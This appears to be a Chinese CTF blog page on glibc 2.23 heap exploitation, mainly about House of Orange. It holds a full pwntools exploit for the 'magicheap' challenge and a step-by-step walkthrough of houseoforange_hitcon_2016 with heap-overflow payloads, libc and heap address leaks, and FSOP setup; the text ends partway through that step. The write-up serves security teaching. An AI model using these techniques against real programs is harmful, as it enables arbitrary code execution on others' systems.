<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"magicheap"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./file"</span>)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = remote()</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Size of Heap :"</span>)</span><br><span class="line">    p.sendline(str(size)) </span><br><span class="line">    p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">    p.sendline(content) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x006020A0</span> - <span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(magic)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">0x1305</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="magicheap">附件</a></p>
<h2 id="2016-0CTF-zerostorage"><a href="#2016-0CTF-zerostorage" class="headerlink" title="2016_0CTF_zerostorage"></a>2016_0CTF_zerostorage</h2>
	
	</div>
  <a type="button" href="/2021/05/13/unsortedbin-attack/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/13/house-of-orange/" >house of orange</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-13  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="针对类型"><a href="#针对类型" class="headerlink" title="针对类型"></a>针对类型</h2><ol>
<li><p>程序中没有free函数</p>
</li>
<li><p>程序存在堆溢出，可以修改top chunk</p>
</li>
<li><p>使用libc版本：2.23-2.24</p>
<p>2.27不适用原因：取消了abort刷新流的操作</p>
</li>
</ol>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><ol>
<li>堆溢出修改top chunk</li>
<li>申请比top chunk size大的chunk =&gt; top chunk放到unsorted bin中</li>
<li>利用unsorted bin attack结合FSOP（修改IO_list_all劫持到伪造的IO_FILE结构上） =&gt; getshell。</li>
</ol>
<h3 id="2-24"><a href="#2-24" class="headerlink" title="2.24"></a>2.24</h3><blockquote>
<p>待更新</p>
</blockquote>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="free-topchunk"><a href="#free-topchunk" class="headerlink" title="free topchunk"></a>free topchunk</h3><p>申请size&gt;top chunk，调用sysmalloc分配，分为两种情况：</p>
<ol>
<li>size&gt;=mp_.mmap_threshold（0x20000），mmap分配</li>
<li>否则，释放原来的topchunk，并申请一个新的topchunk</li>
</ol>
<h4 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h4><blockquote>
<p>具体看参考的，这里只记录方法</p>
</blockquote>
<ol>
<li>top chunk的size：0x20af1 =&gt;修改为0xaf1，即只保留后三位</li>
<li>申请0x1000大小即可</li>
</ol>
<h3 id="largebin链"><a href="#largebin链" class="headerlink" title="largebin链"></a>largebin链</h3><p>解链<code>unsorted bin</code>的时候，会先把<code>unsorted bin chunk</code>放在<code>large bin</code>中，就会在<code>fd_nextsize</code>和<code>bk_nextsize</code>上留下堆地址</p>
<h3 id="fsop"><a href="#fsop" class="headerlink" title="fsop"></a>fsop</h3><ol>
<li>利用unosortedbin attack修改<code>_IO_list_all</code>，即修改bk为<code>_IO_list_all-0x10</code><ul>
<li>如果<code>main_arena + 88</code>作为文件流地址，那么它的<code>chain</code>指针对应的是<code>smallbin[0x60]</code>。</li>
</ul>
</li>
<li>伪造fake IOFILE，大小为0x60，放入small bin中</li>
</ol>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><blockquote>
<p>house of orange经典题目</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>build：创建。一共创建三个chunk</p>
<p>第一个chunk：0x10大小，存放house指针和orange指针</p>
<p>第二个chunk：指定size创建chunk，填入content</p>
<p>第三个chunk：0x8大小，存放price和color</p>
</li>
<li><p>see：打印chunk内容</p>
</li>
<li><p>upgrade：重新指定size，修改chunk内容。故存在堆溢出</p>
</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><blockquote>
<p>程序没有free函数，且存在堆溢出，故使用house of orange技术。</p>
</blockquote>
<ol>
<li>因为程序中没有free函数且存在堆溢出，故修改top chunk内容，再malloc一个大chunk，从而获得一个unsortedbin。</li>
<li>接着分割unsortedbin，得到largebin，从而泄露libc_base和heap_base</li>
<li>将old top chunk大小修改为0x60，并伪造io file。</li>
<li>利用unsortedbin attack修改<code>_IO_list_all</code>，使得0x60的chunk对应<code>_IO_list_all</code>的<code>_chain</code></li>
<li>再次malloc，由于unsortedbin attack后，unsortedbin链异常，故会触发malloc异常，刷新流，找到伪造的io file</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file houseoforange_hitcon_2016 </span><br><span class="line">houseoforange_hitcon_2016: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;a58bda41b65d38949498561b0f2b976ce5c0c301, stripped</span><br><span class="line"></span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec houseoforange_hitcon_2016 </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;houseoforange_hitcon_2016&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h4 id="1-分配一个块"><a href="#1-分配一个块" class="headerlink" title="1.分配一个块"></a>1.分配一个块</h4><blockquote>
<p>用来溢出修改top chunk</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555a2060</span><br><span class="line">Size: 0x20fa1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555555a2000</span><br><span class="line">0x5555555a2000:	0x0000000000000000	0x0000000000000021#存放house和orange指针的chunk</span><br><span class="line">0x5555555a2010:	0x00005555555a2050	0x00005555555a2030</span><br><span class="line">0x5555555a2020:	0x0000000000000000	0x0000000000000021#存放house内容的chunk，可以溢出</span><br><span class="line">0x5555555a2030:	0x0000000000000061	0x0000000000000000</span><br><span class="line">0x5555555a2040:	0x0000000000000000	0x0000000000000021#存放price和color的chunk</span><br><span class="line">0x5555555a2050:	0x0000001f00000001	0x0000000000000000</span><br><span class="line">0x5555555a2060:	0x0000000000000000	0x0000000000020fa1#top chunk，保留0xfa1即可</span><br><span class="line">0x5555555a2070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="2-溢出，修改top-chunk"><a href="#2-溢出，修改top-chunk" class="headerlink" title="2.溢出，修改top chunk"></a>2.溢出，修改top chunk</h4><blockquote>
<p>通过edit的堆溢出，修改top chunk为0xfa1</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(len(payload),payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556341060</span><br><span class="line">Size: 0xfa1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x555556341000</span><br><span class="line">0x555556341000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555556341010:	0x0000555556341050	0x0000555556341030</span><br><span class="line">0x555556341020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x555556341030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x555556341040:	0x6161616161616161	0x0000000000000021</span><br><span class="line">0x555556341050:	0x0000ddaa00000001	0x0000000000000000</span><br><span class="line">0x555556341060:	0x0000000000000000	0x0000000000000fa1</span><br><span class="line">0x555556341070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556341080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="3-申请大块，释放top-chunk"><a href="#3-申请大块，释放top-chunk" class="headerlink" title="3.申请大块，释放top chunk"></a>3.申请大块，释放top chunk</h4><blockquote>
<p>申请一个大于0xfa1的chunk，如0x1000，old top chunk会被放入unsortedbin中，并会申请一个新的top chunk</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5555574930a0</span><br><span class="line">Size: 0xf41</span><br><span class="line">fd: 0x7fcd0ff56b78</span><br><span class="line">bk: 0x7fcd0ff56b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555557493fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555557493ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555557494000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555574930a0 —▸ 0x7fcd0ff56b78 (main_arena+88) ◂— 0x5555574930a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<h4 id="4-切割old-topchunk为large-chunk"><a href="#4-切割old-topchunk为large-chunk" class="headerlink" title="4.切割old topchunk为large chunk"></a>4.切割old topchunk为large chunk</h4><blockquote>
<p>large chunk中留有libc_base和heap_base，可以show出来</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564940a0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE#申请来的chunk</span><br><span class="line">Addr: 0x5555564940c0</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555564944d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE#top chunk</span><br><span class="line">Addr: 0x5555564944f0</span><br><span class="line">Size: 0xaf1</span><br><span class="line">fd: 0x7fe4acc50b78</span><br><span class="line">bk: 0x7fe4acc50b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555556494fe0</span><br><span class="line">Size: 0x10</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556494ff0</span><br><span class="line">Size: 0x11</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555556495000</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x5555564940c0</span><br><span class="line">0x5555564940c0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x5555564940d0:	0x00007fe4acc51161	0x00007fe4acc51188</span><br><span class="line">0x5555564940e0:	0x00005555564940c0	0x00005555564940c0</span><br><span class="line">0x5555564940f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556494100:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x555556494000     0x5555564d7000 rw-p    43000 0      [heap]</span><br><span class="line">    0x7fe4ac8b5000     0x7fe4aca4d000 r-xp   198000 0      &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4aca4d000     0x7fe4acc4c000 ---p   1ff000 198000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4acc4c000     0x7fe4acc50000 r--p     4000 197000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br><span class="line">    0x7fe4acc50000     0x7fe4acc52000 rw-p     2000 19b000 &#x2F;usr&#x2F;local&#x2F;glibc-2.23&#x2F;lib&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure>

<h4 id="泄漏libc-base和heap-base"><a href="#泄漏libc-base和heap-base" class="headerlink" title="泄漏libc_base和heap_base"></a>泄漏libc_base和heap_base</h4><blockquote>
<p>这里，name的时候要用send，sendline的话，会导致这里有问题，，，，</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show()</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39c161</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libcbase))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x271 bytes:</span><br><span class="line">    00000000  4e 61 6d 65  20 6f 66 20  68 6f 75 73  65 20 3a 20  │Name│ of │hous│e : │</span><br><span class="line">    00000010  61 61 d9 d1  6e 7f 0a 50  72 69 63 65  20 6f 66 20  │aa··│n··P│rice│ of │</span><br><span class="line">[...]</span><br><span class="line">[+] libc_base:0x7f6ed19fa000</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">edit(len(payload),payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0xc0</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x29c bytes:</span><br><span class="line">    00000000  4e 61 6d 65  20 6f 66 20  68 6f 75 73  65 20 3a 20  │Name│ of │hous│e : │</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000020  61 61 61 61  61 61 61 61  c0 10 f0 55  55 55 0a 50  │aaaa│aaaa│···U│UU·P│</span><br><span class="line">[+] heap_base:0x555555f01000</span><br></pre></td></tr></table></figure>

<h4 id="5-fsop"><a href="#5-fsop" class="headerlink" title="5.fsop"></a>5.fsop</h4><blockquote>
<p>通过溢出，修改原来top chunk的内容。</p>
<ol>
<li><p>修改size为0x60，从而unsortbin取走后放入smallbin0x60大小中</p>
</li>
<li><p>伪造io file，最开始放上’/bin/sh\x00’，<code>IO_write_ptr=1&gt;IO_write_base=0</code>，伪造vtache，在_IO_overflow放上system地址</p>
</li>
